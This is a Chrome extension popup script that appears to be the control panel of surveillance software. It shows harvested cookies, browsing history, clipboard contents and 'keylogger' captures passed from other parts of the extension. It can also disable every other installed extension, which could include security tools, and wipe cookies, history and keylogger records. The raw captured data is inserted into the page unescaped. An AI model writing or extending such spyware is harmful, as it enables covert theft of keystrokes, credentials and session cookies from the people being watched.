document.addEventListener('DOMContentLoaded', function () {
  document.getElementById('disableExtensions').addEventListener('click', function () {
    chrome.management.getAll(function (extensions) {
      extensions.forEach(function (extension) {
        if (extension.id !== chrome.runtime.id) {
          chrome.management.setEnabled(extension.id, false);
        }
      });
      chrome.notifications.create({
        type: 'basic',
        iconUrl: 'icon.png',
        title: 'Extensions Disabled',
        message: 'All other extensions have been disabled!',
      });
    });
  });

  document.getElementById('enableExtensions').addEventListener('click', function () {
    chrome.management.getAll(function (extensions) {
      extensions.forEach(function (extension) {
        chrome.management.setEnabled(extension.id, true);
      });
      chrome.notifications.create({
        type: 'basic',
        iconUrl: 'icon.png',
        title: 'Extensions Enabled',
        message: 'All extensions have been enabled!',
      });
    });
  });

  chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    switch (message.type) {
      case 'cookiesUpdate':
        document.getElementById('cookiesOutput').innerHTML = '<pre>' + JSON.stringify(message.data, null, 2) + '</pre>';
        break;
      case 'historyUpdate':
        document.getElementById('historyOutput').innerHTML = '<pre>' + JSON.stringify(message.data, null, 2) + '</pre>';
        break;
      case 'extensionsUpdate':
        document.getElementById('extensionsOutput').innerHTML =
          '<pre>' + JSON.stringify(message.data, null, 2) + '</pre>';
        break;
      case 'keyloggerUpdate':
        document.getElementById('keyloggerOutput').innerHTML = '<pre>' + message.data + '</pre>';
        break;
      case 'clipboardUpdate':
        document.getElementById('clipboardOutput').innerHTML = '<pre>' + message.data + '</pre>';
        break;
    }
  });
});

document.getElementById('clearCookies').addEventListener('click', () => {
  chrome.cookies.getAll({}, (cookies) => {
    cookies.forEach((cookie) => {
      let url = `http${cookie.secure ? 's' : ''}://${cookie.domain}${cookie.path}`;
      chrome.cookies.remove({ url: url, name: cookie.name });
      console.log('All cookies have been cleared.');
    });
  });
});

document.getElementById('clearHistory').addEventListener('click', () => {
  chrome.history.deleteAll(() => {
    console.log('Browser history has been cleared.');
  });
});

document.getElementById('clearKeylogger').addEventListener('click', () => {
  document.getElementById('keyloggerOutput').innerHTML = '';

  // 清空 Chrome 存儲的 keylogger 資料
  chrome.storage.local.set({ keylogger: [] }, () => console.log('Keylogger data cleared'));
});
